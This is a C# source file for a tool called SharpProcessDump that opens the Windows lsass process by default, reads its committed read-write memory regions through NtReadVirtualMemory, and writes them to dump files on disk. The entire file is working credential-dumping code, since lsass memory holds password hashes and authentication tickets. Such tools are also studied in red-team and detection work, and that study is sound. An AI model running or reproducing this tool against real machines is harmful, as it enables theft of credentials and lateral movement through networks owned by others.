using System;
using System.Diagnostics;
using static SharpProcessDump.Win32;


namespace SharpProcessDump
{
    internal class Program
    {
        public const int MEM_COMMIT = 0x00001000;
        public const int PAGE_READWRITE = 0x04;
        public const uint PROCESS_QUERY_INFORMATION = 0x0400;
        public const uint PROCESS_VM_READ = 0x0010;
        public const int MAXIMUM_ALLOWED = 0x02000000;
        public const uint GENERIC_ALL = 0x10000000;
        public const uint FILE_SHARE_WRITE = 0x00000002;
        public const uint CREATE_ALWAYS = 2;
        public const uint FILE_ATTRIBUTE_NORMAL = 128;


        static void WriteToFile(byte[] buffer, int bufferSize, string filename)
        {
            // Write to file
            IntPtr hFile = CreateFileA(filename, GENERIC_ALL, FILE_SHARE_WRITE, IntPtr.Zero, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
            WriteFile(hFile, buffer, (uint)bufferSize, out _, IntPtr.Zero);
        }


        static void Main(string[] args)
        {
            // Get process and file name
            string procname = "lsass";
            string dumpfile = "dump.dmp";
            if (args.Length > 0) { 
                procname = args[0];
            }
            if (args.Length > 1)
            {
                dumpfile = args[1];
            }
            Console.WriteLine("[+] Dumping " + procname + " to file " + dumpfile);

            //Get process PID
            Process[] process_list = Process.GetProcessesByName(procname);
            if (process_list.Length == 0)
            {
                Console.WriteLine("[-] Process " + procname + " not found.");
                Environment.Exit(0);
            }
            int processPID = process_list[0].Id;
            Console.WriteLine("[+] Process PID: " + processPID);

            // OpenProcess
            IntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, processPID);
            Console.WriteLine("[+] Process handle: " + processHandle);
            if (processHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-] OpenProcess failed. Do you have enough privileges for this process?");
                Environment.Exit(0);
            }

            // Loop the memory regions
            long proc_max_address_l = (long)0x7FFFFFFEFFFF;
            IntPtr aux_address = IntPtr.Zero;
            byte[] aux_bytearray = {};
            while ((long)aux_address < proc_max_address_l)
            {
                // Populate MEMORY_BASIC_INFORMATION struct calling VirtualQueryEx
                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
                int res = VirtualQueryEx(processHandle, (IntPtr)aux_address, out mbi, 0x30); // (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)));

                // If readable and commited --> Write memory region to a file
                if (mbi.Protect == PAGE_READWRITE && mbi.State == MEM_COMMIT)
                {
                    Console.WriteLine("[*] Dumping memory region 0x" + aux_address.ToString("X") + " (" + mbi.RegionSize + " bytes)");
                    byte[] buffer = new byte[(int)mbi.RegionSize];
                    NtReadVirtualMemory(processHandle, mbi.BaseAddress, buffer, (int)mbi.RegionSize, out _);
                    string memdump_filename = procname + "_" + processPID + "_0x" + aux_address.ToString("X") + ".dmp";
                    WriteToFile(buffer, (int)mbi.RegionSize, memdump_filename);
                    byte[] new_bytearray = new byte[aux_bytearray.Length + buffer.Length];
                    System.Buffer.BlockCopy(aux_bytearray, 0, new_bytearray, 0, aux_bytearray.Length);
                    System.Buffer.BlockCopy(buffer, 0, new_bytearray, aux_bytearray.Length, buffer.Length);
                    aux_bytearray = new_bytearray;
                }

                // Next memory region
                aux_address = (IntPtr)((ulong)aux_address + (ulong)mbi.RegionSize);
            }

            // Dump all byte arrays to one single file
            WriteToFile(aux_bytearray, aux_bytearray.Length, dumpfile);
        }
    }
}